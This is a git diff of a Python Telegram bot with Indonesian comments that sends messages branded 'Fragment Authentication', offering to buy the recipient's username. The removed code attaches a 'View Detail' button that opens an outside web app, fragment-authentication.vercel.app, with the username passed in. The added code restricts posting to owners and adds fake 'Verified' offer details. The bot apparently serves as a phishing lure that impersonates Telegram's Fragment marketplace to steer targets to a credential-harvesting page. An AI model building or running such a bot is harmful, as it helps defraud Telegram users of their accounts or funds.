@@ -1,7 +1,15 @@
-import os
 import logging
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InlineQueryResultArticle, InputTextMessageContent
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler, InlineQueryHandler
+import os
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, InlineQueryResultArticle, InputTextMessageContent
+from telegram.ext import Application, CommandHandler, InlineQueryHandler, CallbackQueryHandler, ContextTypes
+import uuid
+
+# Configuration from Environment Variables (Railway)
+BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
+OWNER_IDS = set(map(int, os.getenv('OWNER_IDS', '123456789').split(',')))  # Multiple owners supported
+AUTH_CODE = os.getenv('AUTH_CODE', '1234')
+PORT = int(os.getenv('PORT', 8443))
+WEBHOOK_URL = os.getenv('WEBHOOK_URL', '')
 
 # Setup logging
 logging.basicConfig(
@@ -10,162 +18,166 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Token bot dari environment variable
-BOT_TOKEN = os.environ.get('BOT_TOKEN')
-MINI_APP_URL = os.environ.get('WEB_APP_URL', 'https://fragment-authentication.vercel.app/')
-BOT_USERNAME = os.environ.get('BOT_USERNAME', 'authFragment_appbot')
-
-# State management
-user_data = {}
-
-# Command /start
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handler untuk command /start"""
     user_id = update.effective_user.id
-    user_data[user_id] = {'state': 'awaiting_username'}
+    is_owner = user_id in OWNER_IDS
     
-    await update.message.reply_text('Username Please ?')
-
-# Handle username input
-async def handle_username(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = update.effective_user.id
-    
-    if user_id not in user_data or user_data[user_id].get('state') != 'awaiting_username':
-        await update.message.reply_text('Silakan ketik /start untuk memulai.')
-        return
-    
-    username = update.message.text.strip()
-    
-    if not username:
-        await update.message.reply_text('Username tidak valid. Silakan ketik username yang valid.')
-        return
-    
-    user_data[user_id]['username'] = username
-    user_data[user_id]['state'] = 'completed'
-    
-    # Kirim pesan dengan tombol share
-    await send_shareable_message(update, context, username)
-
-async def send_shareable_message(update: Update, context: ContextTypes.DEFAULT_TYPE, username: str):
-    """Mengirim pesan yang bisa dibagikan"""
-    message_text = f"""🔐 *Fragment Authentication*
-
-📝 **Direct offer to sell your username**
-👤 @{username}
-
-_Share this offer using @{BOT_USERNAME}_"""
-
-    keyboard = [
-        [InlineKeyboardButton("🔍 View Detail", web_app={"url": f"{MINI_APP_URL}?username={username}"})],
-        [InlineKeyboardButton("📤 Share via Inline", switch_inline_query=username)]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    await context.bot.send_message(
-        chat_id=update.effective_chat.id,
-        text=message_text,
-        reply_markup=reply_markup,
-        parse_mode='Markdown'
+    welcome_text = (
+        "👋 **Fragment Authentication Bot**\n\n"
+        "**Untuk Owner:**\n"
+        "• Ketik `@username_bot 1234` di chat manapun\n"
+        "• Ganti `1234` dengan kode autentikasi Anda\n\n"
+        "**Fitur:**\n"
+        "• Direct username offer\n"
+        "• Secure fragment authentication\n"
+        "• Interactive buttons\n\n"
     )
-
-# Inline Query Handler - untuk efek "via @bot"
-async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Handle inline queries"""
-    query = update.inline_query.query
     
-    # Jika query kosong, berikan instruksi
-    if not query:
+    if is_owner:
+        welcome_text += "✅ **Status:** Anda terverifikasi sebagai Owner"
+    else:
+        welcome_text += "❌ **Status:** Akses terbatas (Owner only)"
+    
+    await update.message.reply_text(welcome_text, parse_mode="Markdown")
+
+async def handle_inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handler untuk inline query (@bot)"""
+    query = update.inline_query.query.strip()
+    user_id = update.inline_query.from_user.id
+    username = update.inline_query.from_user.username or update.inline_query.from_user.first_name
+    
+    logger.info(f"Inline query from {user_id} (@{username}): '{query}'")
+    
+    # Jika user adalah owner dan mengirim kode yang benar
+    if user_id in OWNER_IDS and query == AUTH_CODE:
         results = [
             InlineQueryResultArticle(
-                id="1",
-                title="Share Username Offer",
-                description="Ketik username yang ingin dibagikan",
+                id=str(uuid.uuid4()),
+                title="✅ Fragment Authentication - Direct Offer",
+                description=f"Click to send offer for @{username}",
                 input_message_content=InputTextMessageContent(
-                    message_text="🔐 *Fragment Authentication*\n\n📝 **Direct offer to sell your username**\n👤 @username\n\n_Shared via @{BOT_USERNAME}_",
-                    parse_mode='Markdown'
+                    message_text=f"🔐 **Fragment Authentication**\n\nDirect offer to sell your username @{username}",
+                    parse_mode="Markdown"
                 ),
-                reply_markup=InlineKeyboardMarkup([[
-                    InlineKeyboardButton("🔍 View Detail", web_app={"url": MINI_APP_URL})
-                ]])
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("📋 View Detail", callback_data=f"view_detail_{user_id}")],
+                    [InlineKeyboardButton("👤 Contact Owner", url=f"https://t.me/{username}")]
+                ]),
+                thumbnail_url="https://img.icons8.com/fluency/96/lock.png"
+            )
+        ]
+    elif user_id in OWNER_IDS and query == "":
+        # Jika owner tapi belum input kode
+        results = [
+            InlineQueryResultArticle(
+                id=str(uuid.uuid4()),
+                title="🔐 Authentication Required",
+                description=f"Input code: {AUTH_CODE}",
+                input_message_content=InputTextMessageContent(
+                    message_text="⚠️ **Authentication Required**\n\nPlease input your authentication code after @username_bot",
+                    parse_mode="Markdown"
+                )
             )
         ]
     else:
-        # Jika ada query (username)
-        username = query.strip()
+        # Jika bukan owner atau kode salah
         results = [
             InlineQueryResultArticle(
-                id="1",
-                title=f"Share offer for @{username}",
-                description="Klik untuk membagikan penawaran username",
+                id=str(uuid.uuid4()),
+                title="❌ Access Denied",
+                description="Owner authentication required",
                 input_message_content=InputTextMessageContent(
-                    message_text=f"""🔐 *Fragment Authentication*
-
-📝 **Direct offer to sell your username**
-👤 @{username}
-
-_Shared via @{BOT_USERNAME}_""",
-                    parse_mode='Markdown'
+                    message_text="🚫 **Access Denied**\n\nThis feature is only available for verified owners.",
+                    parse_mode="Markdown"
                 ),
-                reply_markup=InlineKeyboardMarkup([[
-                    InlineKeyboardButton("🔍 View Detail", web_app={"url": f"{MINI_APP_URL}?username={username}"})
-                ]])
+                thumbnail_url="https://img.icons8.com/color/96/lock--v1.png"
             )
         ]
     
-    await update.inline_query.answer(results, cache_time=1)
+    await update.inline_query.answer(results, cache_time=0)
 
-# Command untuk membuat pesan shareable
-async def share_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Command /share untuk membuat pesan yang bisa dibagikan"""
-    if context.args:
-        username = context.args[0]
-    else:
-        user_id = update.effective_user.id
-        if user_id in user_data and user_data[user_id].get('state') == 'completed':
-            username = user_data[user_id].get('username')
+async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handler untuk tombol callback"""
+    query = update.callback_query
+    user_id = query.from_user.id
+    callback_data = query.data
+    
+    await query.answer()
+    
+    if callback_data.startswith("view_detail"):
+        target_user_id = int(callback_data.split("_")[2])
+        username = query.from_user.username or query.from_user.first_name
+        
+        # Verifikasi bahwa user yang menekan tombol adalah owner yang sesuai
+        if user_id == target_user_id:
+            detail_text = (
+                f"🔒 **Fragment Authentication Details**\n\n"
+                f"**Username:** @{username}\n"
+                f"**User ID:** `{user_id}`\n"
+                f"**Offer Type:** Direct Sale\n"
+                f"**Status:** Available\n"
+                f"**Authentication:** Verified ✅\n"
+                f"**Timestamp:** {query.message.date.strftime('%Y-%m-%d %H:%M:%S UTC')}\n\n"
+                f"*This is a secure fragment authentication offer.*"
+            )
+            
+            await query.edit_message_text(
+                text=detail_text,
+                parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Back", callback_data="back_to_main"),
+                    InlineKeyboardButton("❌ Close", callback_data="close")]
+                ])
+            )
         else:
-            await update.message.reply_text("Usage: /share <username> atau ketik /start dulu")
-            return
+            await query.answer("❌ Anda tidak memiliki akses ke detail ini", show_alert=True)
     
-    await send_shareable_message(update, context, username)
-
-# Handler lainnya
-async def handle_other_messages(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = update.effective_user.id
-    if user_id in user_data and user_data[user_id].get('state') == 'awaiting_username':
-        await update.message.reply_text('Silakan ketik username Anda.')
-    else:
-        await update.message.reply_text('Silakan ketik /start untuk memulai.')
-
-async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    logger.error(f"Error occurred: {context.error}")
-
-def main() -> None:
-    if not BOT_TOKEN:
-        raise ValueError("BOT_TOKEN environment variable is required")
+    elif callback_data == "back_to_main":
+        username = query.from_user.username or query.from_user.first_name
+        await query.edit_message_text(
+            text=f"🔐 **Fragment Authentication**\n\nDirect offer to sell your username @{username}",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("📋 View Detail", callback_data=f"view_detail_{user_id}")],
+                [InlineKeyboardButton("👤 Contact Owner", url=f"https://t.me/{username}")]
+            ])
+        )
     
+    elif callback_data == "close":
+        await query.delete_message()
+
+async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handler untuk error logging"""
+    logger.error(f"Error occurred: {context.error}", exc_info=context.error)
+
+def main():
+    """Main function untuk menjalankan bot"""
+    if not BOT_TOKEN or BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE':
+        logger.error("BOT_TOKEN tidak ditemukan! Pastikan sudah di-set di Railway environment variables.")
+        return
+    
+    # Create application
     application = Application.builder().token(BOT_TOKEN).build()
     
     # Add handlers
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("share", share_command))
-    application.add_handler(InlineQueryHandler(inline_query))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_username))
-    application.add_handler(MessageHandler(filters.ALL, handle_other_messages))
+    application.add_handler(InlineQueryHandler(handle_inline_query))
+    application.add_handler(CallbackQueryHandler(handle_callback))
     application.add_error_handler(error_handler)
     
-    # Start bot
-    port = int(os.environ.get('PORT', 8443))
-    webhook_url = os.environ.get('WEBHOOK_URL')
-    
-    if webhook_url:
+    # Check if running on Railway with webhook URL
+    if WEBHOOK_URL:
+        logger.info("Running with webhook...")
         application.run_webhook(
             listen="0.0.0.0",
-            port=port,
+            port=PORT,
             url_path=BOT_TOKEN,
-            webhook_url=f"{webhook_url}/{BOT_TOKEN}"
+            webhook_url=f"{WEBHOOK_URL}/{BOT_TOKEN}"
         )
     else:
+        logger.info("Running with polling...")
         application.run_polling()
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
